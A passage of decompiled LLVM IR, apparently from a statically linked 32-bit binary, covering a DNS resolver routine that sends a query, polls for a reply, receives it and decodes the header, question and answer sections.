  %v17_8055e16 = phi i32 [ %v1_8055de6, %dec_label_pc_8055dcf ], [ %v0_805617f.pre, %dec_label_pc_8055e08 ]
  %v1_8055e16 = add i32 %v17_8055e16, 28
  %v2_8055e16 = inttoptr i32 %v1_8055e16 to i32*
  %v3_8055e16 = load i32, i32* %v2_8055e16, align 4
  %v4_8055e16 = add i32 %v3_8055e16, 1
  store i32 %v4_8055e16, i32* %v2_8055e16, align 4
  br label %dec_label_pc_80561a0.backedge

dec_label_pc_8055e1f:                             ; preds = %dec_label_pc_8055ded
  %v0_8055e1f = load i32, i32* @ebx, align 4
  %v1_8055e1f = load i32, i32* @esi, align 4
  %v2_8055e1f = add i32 %v1_8055e1f, %v0_8055e1f
  store i32 %v2_8055e1f, i32* %eax.global-to-local, align 4
  %v1_8055e22 = add i32 %v0_8055e01, 12
  %v2_8055e22 = inttoptr i32 %v1_8055e22 to i32*
  store i32 0, i32* %v2_8055e22, align 4
  %v0_8055e24 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055e24 = add i32 %v0_8055e01, 8
  %v3_8055e24 = inttoptr i32 %v2_8055e24 to i32*
  store i32 %v0_8055e24, i32* %v3_8055e24, align 4
  %v2_8055e25 = add i32 %v0_8055e01, 4
  %v3_8055e25 = inttoptr i32 %v2_8055e25 to i32*
  store i32 %v2_8055b32, i32* %v3_8055e25, align 4
  %v1_8055e26 = add i32 %v0_8055e01, 36
  %v2_8055e26 = inttoptr i32 %v1_8055e26 to i32*
  %v3_8055e26 = load i32, i32* %v2_8055e26, align 4
  %v6_8055e26 = inttoptr i32 %v0_8055e01 to i32*
  store i32 %v3_8055e26, i32* %v6_8055e26, align 4
  %v5_8055e2a = call i32 @__libc_send(i32 -1, i32 %v15_8055bc0, i32 %v3_8055c1f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055e2a, i32* %eax.global-to-local, align 4
  %v0_8055e2f = load i32, i32* @esp, align 4
  %v1_8055e2f = add i32 %v0_8055e2f, 36
  %v2_8055e2f = inttoptr i32 %v1_8055e2f to i32*
  %v3_8055e2f = load i32, i32* %v2_8055e2f, align 4
  %v2_8055e33 = add i32 %v0_8055e2f, 228
  %v3_8055e33 = inttoptr i32 %v2_8055e33 to i32*
  store i32 %v3_8055e2f, i32* %v3_8055e33, align 4
  %v0_8055e3a = load i32, i32* @esp, align 4
  %v1_8055e3a = add i32 %v0_8055e3a, 232
  %v2_8055e3a = inttoptr i32 %v1_8055e3a to i16*
  store i16 1, i16* %v2_8055e3a, align 2
  %v0_8055e44 = load i32, i32* @esp, align 4
  %v1_8055e47 = add i32 %v0_8055e44, 8
  %v2_8055e47 = inttoptr i32 %v1_8055e47 to i32*
  store i32 10000, i32* %v2_8055e47, align 4
  %v1_8055e4c = add i32 %v0_8055e44, 4
  %v2_8055e4c = inttoptr i32 %v1_8055e4c to i32*
  store i32 1, i32* %v2_8055e4c, align 4
  %v1_8055e4e = add i32 %v0_8055e44, 228
  store i32 %v1_8055e4e, i32* %eax.global-to-local, align 4
  %v3_8055e55 = inttoptr i32 %v0_8055e44 to i32*
  store i32 %v1_8055e4e, i32* %v3_8055e55, align 4
  %v0_8055e56 = call i32 @__libc_poll()
  store i32 %v0_8055e56, i32* %eax.global-to-local, align 4
  %v0_8055e5b = load i32, i32* @esp, align 4
  %v1_8055e5b = add i32 %v0_8055e5b, 16
  %tmp48 = icmp slt i32 %v0_8055e56, 1
  br i1 %tmp48, label %dec_label_pc_805617f, label %dec_label_pc_8055e66

dec_label_pc_8055e66:                             ; preds = %dec_label_pc_8055e1f
  %v1_8055e66 = add i32 %v0_8055e5b, 12
  %v2_8055e66 = inttoptr i32 %v1_8055e66 to i32*
  store i32 0, i32* %v2_8055e66, align 4
  %v1_8055e68 = add i32 %v0_8055e5b, 8
  %v2_8055e68 = inttoptr i32 %v1_8055e68 to i32*
  store i32 512, i32* %v2_8055e68, align 4
  %v2_8055e6d = add i32 %v0_8055e5b, 4
  %v3_8055e6d = inttoptr i32 %v2_8055e6d to i32*
  store i32 %v2_8055b32, i32* %v3_8055e6d, align 4
  %v1_8055e6e = add i32 %v0_8055e5b, 36
  %v2_8055e6e = inttoptr i32 %v1_8055e6e to i32*
  %v3_8055e6e = load i32, i32* %v2_8055e6e, align 4
  %v6_8055e6e = inttoptr i32 %v0_8055e5b to i32*
  store i32 %v3_8055e6e, i32* %v6_8055e6e, align 4
  %v5_8055e72 = call i32 @__libc_recv(i32 -1, i32 %v15_8055bc0, i32 %v3_8055c1f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055e72, i32* @eax, align 4
  %v1_8055e77 = load i32, i32* @esp, align 4
  %v2_8055e77 = add i32 %v1_8055e77, 32
  %v3_8055e77 = inttoptr i32 %v2_8055e77 to i32*
  store i32 %v5_8055e72, i32* %v3_8055e77, align 4
  %v0_8055e7b = load i32, i32* @esp, align 4
  %v1_8055e7b = add i32 %v0_8055e7b, 16
  %v7_8055e81 = icmp sgt i32 %v5_8055e72, 11
  br i1 %v7_8055e81, label %dec_label_pc_8055e87, label %dec_label_pc_8056134

dec_label_pc_8055e87:                             ; preds = %dec_label_pc_8055e66
  %v0_8055e87 = load i32, i32* @ebx, align 4
  %v2_8055e87 = add i32 %v0_8055e7b, 12
  %v3_8055e87 = inttoptr i32 %v2_8055e87 to i32*
  store i32 %v0_8055e87, i32* %v3_8055e87, align 4
  %v0_8055e88 = load i32, i32* @ebx, align 4
  %v2_8055e88 = add i32 %v0_8055e7b, 8
  %v3_8055e88 = inttoptr i32 %v2_8055e88 to i32*
  store i32 %v0_8055e88, i32* %v3_8055e88, align 4
  %v1_8055e89 = add i32 %v0_8055e7b, 84
  store i32 %v1_8055e89, i32* %eax.global-to-local, align 4
  %v2_8055e8d = add i32 %v0_8055e7b, 4
  %v3_8055e8d = inttoptr i32 %v2_8055e8d to i32*
  store i32 %v1_8055e89, i32* %v3_8055e8d, align 4
  %v3_8055e8e = inttoptr i32 %v0_8055e7b to i32*
  store i32 %v2_8055b32, i32* %v3_8055e8e, align 4
  %v0_8055e8f = call i32 @__decode_header()
  store i32 %v0_8055e8f, i32* %eax.global-to-local, align 4
  %v0_8055e94 = load i32, i32* @esp, align 4
  %v1_8055e94 = add i32 %v0_8055e94, 84
  %v2_8055e94 = inttoptr i32 %v1_8055e94 to i32*
  %v3_8055e94 = load i32, i32* %v2_8055e94, align 4
  store i32 %v3_8055e94, i32* %edx.global-to-local, align 4
  %v2_8055e98 = add i32 %v0_8055e94, 72
  %v3_8055e98 = inttoptr i32 %v2_8055e98 to i32*
  store i32 %v3_8055e94, i32* %v3_8055e98, align 4
  %v0_8055e9c = load i32, i32* @esp, align 4
  %v1_8055e9c = add i32 %v0_8055e9c, 16
  %v1_8055e9f = add i32 %v0_8055e9c, 60
  %v2_8055e9f = inttoptr i32 %v1_8055e9f to i32*
  %v3_8055e9f = load i32, i32* %v2_8055e9f, align 4
  store i32 %v3_8055e9f, i32* @eax, align 4
  %v0_8055ea3 = load i32, i32* %edx.global-to-local, align 4
  %v12_8055ea3 = icmp eq i32 %v0_8055ea3, %v3_8055e9f
  %v1_8055ea5 = icmp eq i1 %v12_8055ea3, false
  br i1 %v1_8055ea5, label %dec_label_pc_8056134, label %dec_label_pc_8055eab

dec_label_pc_8055eab:                             ; preds = %dec_label_pc_8055e87
  %v1_8055eab = add i32 %v0_8055e9c, 88
  %v2_8055eab = inttoptr i32 %v1_8055eab to i32*
  %v3_8055eab = load i32, i32* %v2_8055eab, align 4
  %v4_8055eab = icmp eq i32 %v3_8055eab, 0
  br i1 %v4_8055eab, label %dec_label_pc_8056134, label %dec_label_pc_8055eb6

dec_label_pc_8055eb6:                             ; preds = %dec_label_pc_8055eab
  %v1_8055eb6 = add i32 %v0_8055e9c, 112
  %v2_8055eb6 = inttoptr i32 %v1_8055eb6 to i32*
  %v3_8055eb6 = load i32, i32* %v2_8055eb6, align 4
  store i32 %v3_8055eb6, i32* @eax, align 4
  %v9_8055eba = icmp eq i32 %v3_8055eb6, 3
  %v1_8055ebd = icmp eq i1 %v9_8055eba, false
  br i1 %v1_8055ebd, label %dec_label_pc_8055f25, label %dec_label_pc_8055ebf

dec_label_pc_8055ebf:                             ; preds = %dec_label_pc_8055eb6
  %v1_8055ebf = add i32 %v0_8055e9c, 67
  %v2_8055ebf = inttoptr i32 %v1_8055ebf to i8*
  %v3_8055ebf = load i8, i8* %v2_8055ebf, align 1
  %v4_8055ebf = icmp eq i8 %v3_8055ebf, 0
  %v1_8055ec4 = icmp eq i1 %v4_8055ebf, false
  br i1 %v1_8055ec4, label %dec_label_pc_8055f15, label %dec_label_pc_8055ec6

dec_label_pc_8055ec6:                             ; preds = %dec_label_pc_8055ebf
  %v0_8055ec6 = load i32, i32* @ecx, align 4
  %v2_8055ec6 = add i32 %v0_8055e9c, 12
  %v3_8055ec6 = inttoptr i32 %v2_8055ec6 to i32*
  store i32 %v0_8055ec6, i32* %v3_8055ec6, align 4
  %v1_8055ec7 = add i32 %v0_8055e9c, 8
  %v2_8055ec7 = inttoptr i32 %v1_8055ec7 to i32*
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %v2_8055ec7, align 4
  %v1_8055ecc = add i32 %v0_8055e9c, 4
  %v2_8055ecc = inttoptr i32 %v1_8055ecc to i32*
  store i32 134563799, i32* %v2_8055ecc, align 4
  %v1_8055ed1 = add i32 %v0_8055e9c, 200
  store i32 %v1_8055ed1, i32* @esi, align 4
  %v3_8055ed8 = inttoptr i32 %v0_8055e9c to i32*
  store i32 %v1_8055ed1, i32* %v3_8055ed8, align 4
  %v2_8055ed9 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_8055ed9, i32* %eax.global-to-local, align 4
  %v0_8055ede = load i32, i32* @esp, align 4
  %v1_8055ede = inttoptr i32 %v0_8055ede to i32*
  store i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), i32* %v1_8055ede, align 4
  %v1_8055ee5 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055ee5, i32* %eax.global-to-local, align 4
  %v0_8055eea = load i32, i32* @esp, align 4
  %v1_8055eea = inttoptr i32 %v0_8055eea to i32*
  %v2_8055eea = load i32, i32* %v1_8055eea, align 4
  store i32 %v2_8055eea, i32* @eax, align 4
  %v3_8055eea = add i32 %v0_8055eea, 4
  %v1_8055eeb = inttoptr i32 %v3_8055eea to i32*
  %v2_8055eeb = load i32, i32* %v1_8055eeb, align 4
  store i32 %v2_8055eeb, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8055eeb, align 4
  %v0_8055eee = load i32, i32* @esi, align 4
  store i32 %v0_8055eee, i32* %v1_8055eea, align 4
  %v0_8055eef = load i32, i32* @global_var_8061bd8.561, align 8
  store i32 %v0_8055eef, i32* %ebx.global-to-local, align 4
  %v2_8055ef5 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055bc0)
  store i32 %v2_8055ef5, i32* %eax.global-to-local, align 4
  %v0_8055efa = load i32, i32* @esp, align 4
  %v1_8055efd = add i32 %v0_8055eef, -1
  store i32 %v1_8055efd, i32* @ebx, align 4
  %v1_8055efe = add i32 %v0_8055efa, 52
  %v2_8055efe = inttoptr i32 %v1_8055efe to i32*
  %v3_8055efe = load i32, i32* %v2_8055efe, align 4
  %v5_8055efe = sub i32 %v3_8055efe, %v1_8055efd
  %v11_8055efe = xor i32 %v3_8055efe, %v1_8055efd
  %v12_8055efe = xor i32 %v5_8055efe, %v3_8055efe
  %v13_8055efe = and i32 %v12_8055efe, %v11_8055efe
  %v14_8055efe = icmp slt i32 %v13_8055efe, 0
  %v16_8055efe = icmp slt i32 %v5_8055efe, 0
  %v2_8055f02 = icmp eq i1 %v16_8055efe, %v14_8055efe
  br i1 %v2_8055f02, label %dec_label_pc_8055f15, label %dec_label_pc_8055f04

dec_label_pc_8055f04:                             ; preds = %dec_label_pc_8055ec6
  %v4_8055f04 = add i32 %v3_8055efe, 1
  store i32 %v4_8055f04, i32* %v2_8055efe, align 4
  %v0_8055f08 = load i32, i32* @esp, align 4
  %v1_8055f08 = add i32 %v0_8055f08, 56
  %v2_8055f08 = inttoptr i32 %v1_8055f08 to i32*
  %v3_8055f08 = load i32, i32* %v2_8055f08, align 4
  store i32 %v3_8055f08, i32* %edx.global-to-local, align 4
  %v2_8055f0c = add i32 %v0_8055f08, 44
  %v3_8055f0c = inttoptr i32 %v2_8055f0c to i32*
  store i32 %v3_8055f08, i32* %v3_8055f0c, align 4
  br label %dec_label_pc_80561a0.backedge

dec_label_pc_8055f15:                             ; preds = %dec_label_pc_8055ec6, %dec_label_pc_8055ebf
  %v0_8055f15 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055f15, i32* %eax.global-to-local, align 4
  %v1_8055f1a = inttoptr i32 %v0_8055f15 to i32*
  store i32 1, i32* %v1_8055f1a, align 4
  br label %dec_label_pc_80561d8

dec_label_pc_8055f25:                             ; preds = %dec_label_pc_8055eb6
  %v1_8055f25 = icmp eq i32 %v3_8055eb6, 0
  %v1_8055f27 = icmp eq i1 %v1_8055f25, false
  br i1 %v1_8055f27, label %dec_label_pc_8056134, label %dec_label_pc_8055f2d

dec_label_pc_8055f2d:                             ; preds = %dec_label_pc_8055f25
  %v1_8055f2d = add i32 %v0_8055e9c, 120
  %v2_8055f2d = inttoptr i32 %v1_8055f2d to i32*
  %v3_8055f2d = load i32, i32* %v2_8055f2d, align 4
  %tmp49 = icmp slt i32 %v3_8055f2d, 1
  br i1 %tmp49, label %dec_label_pc_8055f3d, label %dec_label_pc_8055f34

dec_label_pc_8055f34:                             ; preds = %dec_label_pc_8055f2d
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8055f5c55 = add i32 %v0_8055e9c, 116
  %v3_8055f5c56 = inttoptr i32 %v2_8055f5c55 to i32*
  %v4_8055f5c57 = load i32, i32* %v3_8055f5c56, align 4
  %v5_8055f5c58 = sub i32 0, %v4_8055f5c57
  %v13_8055f5c62 = and i32 %v4_8055f5c57, %v5_8055f5c58
  %v14_8055f5c63 = icmp slt i32 %v13_8055f5c62, 0
  %v16_8055f5c65 = icmp slt i32 %v5_8055f5c58, 0
  %v2_8055f6066 = icmp eq i1 %v16_8055f5c65, %v14_8055f5c63
  br i1 %v2_8055f6066, label %dec_label_pc_8055f62, label %dec_label_pc_8055f4d

dec_label_pc_8055f3d:                             ; preds = %dec_label_pc_8055f2d
  %v0_8055f3d = call i32 @__GI___h_errno_location()
  store i32 %v0_8055f3d, i32* %eax.global-to-local, align 4
  %v1_8055f42 = inttoptr i32 %v0_8055f3d to i32*
  store i32 4, i32* %v1_8055f42, align 4
  br label %dec_label_pc_80561d8

dec_label_pc_8055f4d:                             ; preds = %dec_label_pc_8055f34, %dec_label_pc_8055f4d
  %v0_8055f6468 = phi i32 [ %v1_8055f59, %dec_label_pc_8055f4d ], [ %v1_8055e9c, %dec_label_pc_8055f34 ]
  %v0_8055f4d67 = phi i32 [ %v0_8055f51, %dec_label_pc_8055f4d ], [ %v3_8055eb6, %dec_label_pc_8055f34 ]
  %v2_8055f4d = add i32 %v0_8055f6468, -4
  %v3_8055f4d = inttoptr i32 %v2_8055f4d to i32*
  store i32 %v0_8055f4d67, i32* %v3_8055f4d, align 4
  %v0_8055f4e = load i32, i32* @eax, align 4
  %v2_8055f4e = add i32 %v0_8055f6468, -8
  %v3_8055f4e = inttoptr i32 %v2_8055f4e to i32*
  store i32 %v0_8055f4e, i32* %v3_8055f4e, align 4
  %v0_8055f4f = load i32, i32* @esi, align 4
  %v2_8055f4f = add i32 %v0_8055f6468, -12
  %v3_8055f4f = inttoptr i32 %v2_8055f4f to i32*
  store i32 %v0_8055f4f, i32* %v3_8055f4f, align 4
  %v2_8055f50 = add i32 %v0_8055f6468, -16
  %v3_8055f50 = inttoptr i32 %v2_8055f50 to i32*
  store i32 %v2_8055b32, i32* %v3_8055f50, align 4
  %v0_8055f51 = call i32 @__length_question()
  store i32 %v0_8055f51, i32* @eax, align 4
  %v0_8055f56 = load i32, i32* @ebx, align 4
  %v1_8055f56 = add i32 %v0_8055f56, 1
  store i32 %v1_8055f56, i32* @ebx, align 4
  %v0_8055f57 = load i32, i32* @esi, align 4
  %v2_8055f57 = add i32 %v0_8055f57, %v0_8055f51
  store i32 %v2_8055f57, i32* @esi, align 4
  %v0_8055f59 = load i32, i32* @esp, align 4
  %v1_8055f59 = add i32 %v0_8055f59, 16
  %v2_8055f5c = add i32 %v0_8055f59, 116
  %v3_8055f5c = inttoptr i32 %v2_8055f5c to i32*
  %v4_8055f5c = load i32, i32* %v3_8055f5c, align 4
  %v5_8055f5c = sub i32 %v1_8055f56, %v4_8055f5c
  %v11_8055f5c = xor i32 %v4_8055f5c, %v1_8055f56
  %v12_8055f5c = xor i32 %v5_8055f5c, %v1_8055f56
  %v13_8055f5c = and i32 %v12_8055f5c, %v11_8055f5c
  %v14_8055f5c = icmp slt i32 %v13_8055f5c, 0
  %v16_8055f5c = icmp slt i32 %v5_8055f5c, 0
  %v2_8055f60 = icmp eq i1 %v16_8055f5c, %v14_8055f5c
  br i1 %v2_8055f60, label %dec_label_pc_8055f62, label %dec_label_pc_8055f4d

dec_label_pc_8055f62:                             ; preds = %dec_label_pc_8055f4d, %dec_label_pc_8055f34
  %v0_8055f64.lcssa = phi i32 [ %v1_8055e9c, %dec_label_pc_8055f34 ], [ %v1_8055f59, %dec_label_pc_8055f4d ]
  store i32 0, i32* @ebx, align 4
  %v1_8055f64 = add i32 %v0_8055f64.lcssa, 27
  %v2_8055f64 = inttoptr i32 %v1_8055f64 to i8*
  store i8 1, i8* %v2_8055f64, align 1
  %v0_8056092.pre = load i32, i32* @ebx, align 4
  %v1_8056092.pre = load i32, i32* @esp, align 4
  %v2_805609269 = add i32 %v1_8056092.pre, 104
  %v3_805609270 = inttoptr i32 %v2_805609269 to i32*
  %v4_805609271 = load i32, i32* %v3_805609270, align 4
  %v5_805609272 = sub i32 %v0_8056092.pre, %v4_805609271
  %v11_805609274 = xor i32 %v4_805609271, %v0_8056092.pre
  %v12_805609275 = xor i32 %v5_805609272, %v0_8056092.pre
  %v13_805609276 = and i32 %v12_805609275, %v11_805609274
  %v14_805609277 = icmp slt i32 %v13_805609276, 0
  %v16_805609279 = icmp slt i32 %v5_805609272, 0
  %v2_805609680 = icmp eq i1 %v16_805609279, %v14_805609277
  br i1 %v2_805609680, label %dec_label_pc_80560a2, label %dec_label_pc_8056098.lr.ph

dec_label_pc_8056098.lr.ph:                       ; preds = %dec_label_pc_8055f62
  %v0_8056098.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056098

dec_label_pc_8055f6e:                             ; preds = %dec_label_pc_8056098
  %v1_8055f6e = add i32 %v0_8055f6e81, 116
  store i32 %v1_8055f6e, i32* %eax.global-to-local, align 4
  %v2_8055f72 = add i32 %v0_8055f6e81, -4
  %v3_8055f72 = inttoptr i32 %v2_8055f72 to i32*
  store i32 %v1_8055f6e, i32* %v3_8055f72, align 4
  %v3_8055f73 = load i32, i32* %v3_8056098, align 4
  %v5_8055f73 = add i32 %v0_8055f6e81, -8
  %v6_8055f73 = inttoptr i32 %v5_8055f73 to i32*
  store i32 %v3_8055f73, i32* %v6_8055f73, align 4
  %v0_8055f77 = load i32, i32* @esi, align 4
  %v2_8055f77 = add i32 %v0_8055f6e81, -12
  %v3_8055f77 = inttoptr i32 %v2_8055f77 to i32*
  store i32 %v0_8055f77, i32* %v3_8055f77, align 4
  %v2_8055f78 = add i32 %v0_8055f6e81, -16
  %v3_8055f78 = inttoptr i32 %v2_8055f78 to i32*
  store i32 %v2_8055b32, i32* %v3_8055f78, align 4
  %v0_8055f79 = call i32 @__decode_answer()
  store i32 %v0_8055f79, i32* @eax, align 4
  %v1_8055f7e = load i32, i32* @esp, align 4
  %v2_8055f7e = add i32 %v1_8055f7e, 68
  %v3_8055f7e = inttoptr i32 %v2_8055f7e to i32*
  store i32 %v0_8055f79, i32* %v3_8055f7e, align 4
  %v0_8055f82 = load i32, i32* @esp, align 4
  %v1_8055f82 = add i32 %v0_8055f82, 16
  %v2_8055f85 = icmp slt i32 %v0_8055f79, 0
  %v1_8055f87 = icmp eq i1 %v2_8055f85, false
  br i1 %v1_8055f87, label %dec_label_pc_8055fa1, label %dec_label_pc_8055f89

dec_label_pc_8055f89:                             ; preds = %dec_label_pc_8055f6e
  %v0_8055f89 = load i32, i32* @ebx, align 4
  %v1_8055f89 = icmp eq i32 %v0_8055f89, 0
  br i1 %v1_8055f89, label %dec_label_pc_8056134, label %dec_label_pc_8055f91

dec_label_pc_8055f91:                             ; preds = %dec_label_pc_8055f89
  %v1_8055f91 = add i32 %v0_8055f82, 100
  %v2_8055f91 = inttoptr i32 %v1_8055f91 to i32*
  %v3_8055f91 = load i32, i32* %v2_8055f91, align 4
  %v4_8055f91 = icmp eq i32 %v3_8055f91, 0
  br i1 %v4_8055f91, label %dec_label_pc_8056134, label %dec_label_pc_80560a2

dec_label_pc_8055fa1:                             ; preds = %dec_label_pc_8055f6e
  %v1_8055fa1 = add i32 %v0_8055f82, 43
  %v2_8055fa1 = inttoptr i32 %v1_8055fa1 to i8*
  %v3_8055fa1 = load i8, i8* %v2_8055fa1, align 1
  %v4_8055fa1 = icmp eq i8 %v3_8055fa1, 0
  br i1 %v4_8055fa1, label %dec_label_pc_8056042, label %dec_label_pc_8055fac

dec_label_pc_8055fac:                             ; preds = %dec_label_pc_8055fa1
  %v0_8055fac = load i32, i32* @edi, align 4
  %v1_8055fac = add i32 %v0_8055fac, 28
  %v2_8055fac = inttoptr i32 %v1_8055fac to i32*
  %v3_8055fac = load i32, i32* %v2_8055fac, align 4
  store i32 %v3_8055fac, i32* %eax.global-to-local, align 4
  %v2_8055faf = add i32 %v0_8055f82, 160
  %v3_8055faf = inttoptr i32 %v2_8055faf to i32*
  store i32 %v3_8055fac, i32* %v3_8055faf, align 4
  %v0_8055fb6 = load i32, i32* @edi, align 4
  %v1_8055fb6 = add i32 %v0_8055fb6, 32
  %v2_8055fb6 = inttoptr i32 %v1_8055fb6 to i32*
  %v3_8055fb6 = load i32, i32* %v2_8055fb6, align 4
  store i32 %v3_8055fb6, i32* %eax.global-to-local, align 4
  %v1_8055fb9 = load i32, i32* @esp, align 4
  %v2_8055fb9 = add i32 %v1_8055fb9, 148
  %v3_8055fb9 = inttoptr i32 %v2_8055fb9 to i32*
  store i32 %v3_8055fb6, i32* %v3_8055fb9, align 4
  %v0_8055fc0 = load i32, i32* @edi, align 4
  %v1_8055fc0 = add i32 %v0_8055fc0, 36
  %v2_8055fc0 = inttoptr i32 %v1_8055fc0 to i32*
  %v3_8055fc0 = load i32, i32* %v2_8055fc0, align 4
  store i32 %v3_8055fc0, i32* %eax.global-to-local, align 4
  %v1_8055fc3 = load i32, i32* @esp, align 4
  %v2_8055fc3 = add i32 %v1_8055fc3, 152
  %v3_8055fc3 = inttoptr i32 %v2_8055fc3 to i32*
  store i32 %v3_8055fc0, i32* %v3_8055fc3, align 4
  %v0_8055fca = load i32, i32* @ecx, align 4
  %v1_8055fca = load i32, i32* @esp, align 4
  %v2_8055fca = add i32 %v1_8055fca, -4
  %v3_8055fca = inttoptr i32 %v2_8055fca to i32*
  store i32 %v0_8055fca, i32* %v3_8055fca, align 4
  %v1_8055fcb = add i32 %v1_8055fca, -8
  %v2_8055fcb = inttoptr i32 %v1_8055fcb to i32*
  store i32 40, i32* %v2_8055fcb, align 4
  %v1_8055fcd = add i32 %v1_8055fca, 116
  store i32 %v1_8055fcd, i32* %edx.global-to-local, align 4
  %v2_8055fd1 = add i32 %v1_8055fca, -12
  %v3_8055fd1 = inttoptr i32 %v2_8055fd1 to i32*
  store i32 %v1_8055fcd, i32* %v3_8055fd1, align 4
  %v0_8055fd2 = load i32, i32* @edi, align 4
  %v2_8055fd2 = add i32 %v1_8055fca, -16
  %v3_8055fd2 = inttoptr i32 %v2_8055fd2 to i32*
  store i32 %v0_8055fd2, i32* %v3_8055fd2, align 4
  %v5_8055fd3 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8055bc0, i32 %v3_8055c1f)
  store i32 %v5_8055fd3, i32* %eax.global-to-local, align 4
  %v0_8055fd8 = load i32, i32* @edi, align 4
  %v1_8055fd8 = add i32 %v0_8055fd8, 4
  %v2_8055fd8 = inttoptr i32 %v1_8055fd8 to i32*
  %v3_8055fd8 = load i32, i32* %v2_8055fd8, align 4
  store i32 %v3_8055fd8, i32* %eax.global-to-local, align 4
  %v0_8055fdb = load i32, i32* @esp, align 4
  %v1_8055fdb = add i32 %v0_8055fdb, 16
  %v9_8055fde = icmp eq i32 %v3_8055fd8, 24
  br i1 %v9_8055fde, label %dec_label_pc_8055fac.dec_label_pc_8056005_crit_edge, label %dec_label_pc_8055fe3

dec_label_pc_8055fac.dec_label_pc_8056005_crit_edge: ; preds = %dec_label_pc_8055fac
  %.pre24 = add i32 %v0_8055fdb, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8056005.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8056005

dec_label_pc_8055fe3:                             ; preds = %dec_label_pc_8055fac
  %v1_8055fe3 = add i32 %v0_8055fd8, 28
  %v2_8055fe3 = inttoptr i32 %v1_8055fe3 to i32*
  %v3_8055fe3 = load i32, i32* %v2_8055fe3, align 4
  %v4_8055fe3 = icmp eq i32 %v3_8055fe3, 0
  br i1 %v4_8055fe3, label %dec_label_pc_80560a2, label %dec_label_pc_8055fed

dec_label_pc_8055fed:                             ; preds = %dec_label_pc_8055fe3
  %v1_8055fed = add i32 %v0_8055fdb, 260
  %v2_8055fed = inttoptr i32 %v1_8055fed to i32*
  %v3_8055fed = load i32, i32* %v2_8055fed, align 4
  %v12_8055fed = icmp eq i32 %v3_8055fed, 1
  br i1 %v12_8055fed, label %dec_label_pc_8056005, label %dec_label_pc_8055ff7

dec_label_pc_8055ff7:                             ; preds = %dec_label_pc_8055fed
  %v12_8055ff7 = icmp eq i32 %v3_8055fed, 28
  %v1_8055fff = icmp eq i1 %v12_8055ff7, false
  br i1 %v1_8055fff, label %dec_label_pc_80560a2, label %dec_label_pc_8056005

dec_label_pc_8056005:                             ; preds = %dec_label_pc_8055fac.dec_label_pc_8056005_crit_edge, %dec_label_pc_8055ff7, %dec_label_pc_8055fed
  %v4_8056005 = phi i32 [ %v4_8056005.pre, %dec_label_pc_8055fac.dec_label_pc_8056005_crit_edge ], [ %v3_8055fed, %dec_label_pc_8055ff7 ], [ 1, %dec_label_pc_8055fed ]
  %v15_8056005 = icmp eq i32 %v3_8055fd8, %v4_8056005
  br i1 %v15_8056005, label %dec_label_pc_805601a, label %dec_label_pc_805600e

dec_label_pc_805600e:                             ; preds = %dec_label_pc_8056005
  %v1_8056011 = inttoptr i32 %v0_8055fd8 to i32*
  %v2_8056011 = load i32, i32* %v1_8056011, align 4
  %v5_8056011 = inttoptr i32 %v0_8055fdb to i32*
  store i32 %v2_8056011, i32* %v5_8056011, align 4
  %v1_8056013 = call i32 @free(i32 -1)
  store i32 %v1_8056013, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805608a

dec_label_pc_805601a:                             ; preds = %dec_label_pc_8056005
  %v0_805601a = load i32, i32* @ebx, align 4
  %v1_805601c = sub i32 -1, %v0_805601a
  store i32 %v1_805601c, i32* %eax.global-to-local, align 4
  %v2_805601e = add i32 %v0_8055fdb, 120
  %v3_805601e = inttoptr i32 %v2_805601e to i32*
  %v4_805601e = load i32, i32* %v3_805601e, align 4
  %v5_805601e = add i32 %v4_805601e, %v1_805601c
  store i32 %v5_805601e, i32* %eax.global-to-local, align 4
  %v2_8056022 = add i32 %v0_8055fd8, 36
  %v3_8056022 = inttoptr i32 %v2_8056022 to i32*
  store i32 %v5_805601e, i32* %v3_8056022, align 4
  %v0_8056025 = load i32, i32* @edi, align 4
  %v1_8056025 = add i32 %v0_8056025, 16
  %v2_8056025 = inttoptr i32 %v1_8056025 to i32*
  %v3_8056025 = load i32, i32* %v2_8056025, align 4
  %v1_8056028 = add i32 %v3_8056025, 4
  store i32 %v1_8056028, i32* %eax.global-to-local, align 4
  %v2_805602b = add i32 %v0_8056025, 36
  %v3_805602b = inttoptr i32 %v2_805602b to i32*
  %v4_805602b = load i32, i32* %v3_805602b, align 4
  %v7_805602b = mul i32 %v4_805602b, %v1_8056028
  store i32 %v7_805602b, i32* %eax.global-to-local, align 4
  %v2_805602f = add i32 %v0_8056025, 32
  %v3_805602f = inttoptr i32 %v2_805602f to i32*
  %v4_805602f = load i32, i32* %v3_805602f, align 4
  %v6_8056032 = icmp ugt i32 %v7_805602b, %v4_805602f
  br i1 %v6_8056032, label %dec_label_pc_805601a.dec_label_pc_80560a2.loopexit_crit_edge, label %dec_label_pc_8056034

dec_label_pc_805601a.dec_label_pc_80560a2.loopexit_crit_edge: ; preds = %dec_label_pc_805601a
  %v0_80560a2.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80560a2

dec_label_pc_8056034:                             ; preds = %dec_label_pc_805601a
  store i32 0, i32* %v3_805602b, align 4
  %v0_805603b = load i32, i32* @esp, align 4
  %v1_805603b = add i32 %v0_805603b, 27
  %v2_805603b = inttoptr i32 %v1_805603b to i8*
  store i8 0, i8* %v2_805603b, align 1
  %v1_805608d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805608d

dec_label_pc_8056042:                             ; preds = %dec_label_pc_8055fa1
  %v1_8056045 = add i32 %v0_8055f82, 132
  %v2_8056045 = inttoptr i32 %v1_8056045 to i32*
  %v3_8056045 = load i32, i32* %v2_8056045, align 4
